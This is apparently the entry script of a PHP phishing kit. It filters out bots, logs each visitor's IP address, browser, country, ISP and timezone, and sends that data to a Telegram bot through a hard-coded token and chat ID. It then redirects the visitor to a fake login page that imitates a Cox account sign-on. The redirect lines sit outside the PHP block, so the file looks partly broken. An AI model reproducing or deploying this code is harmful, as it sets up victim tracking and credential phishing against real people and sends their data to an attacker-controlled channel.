<?php

include 'bots/bot.php';
include 'bots/ref.php';
include 'bots/blacklist.php';

function genRandString($length = 10)
{
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, strlen($characters) - 1)];
    }
    return $randomString;
}

$ip = $ip . "\r\n";

$log = fopen("", "a") or die("Unable to open file!");
		
fwrite($log, "$ip $BROWSER $LOOKUP_COUNTRY $LOOKUP_ISP $LOOKUP_TIMEZONE");
fclose($log);
$token = "6592198883:AAEN7aTyMwyU_6r3krNYjdZFT9R35XS6IgM";
$data = [
    'text' => "$ip $BROWSER $LOOKUP_COUNTRY $LOOKUP_ISP $LOOKUP_TIMEZONE",
    'chat_id' => '1055835354'
];

file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );


?>

$_SESSION['randString']     = genRandString(80);

header("Location: web/login.php?web/cox/SignOn#/now/overviewAccounts/overview/index={$_SESSION['randString']}");
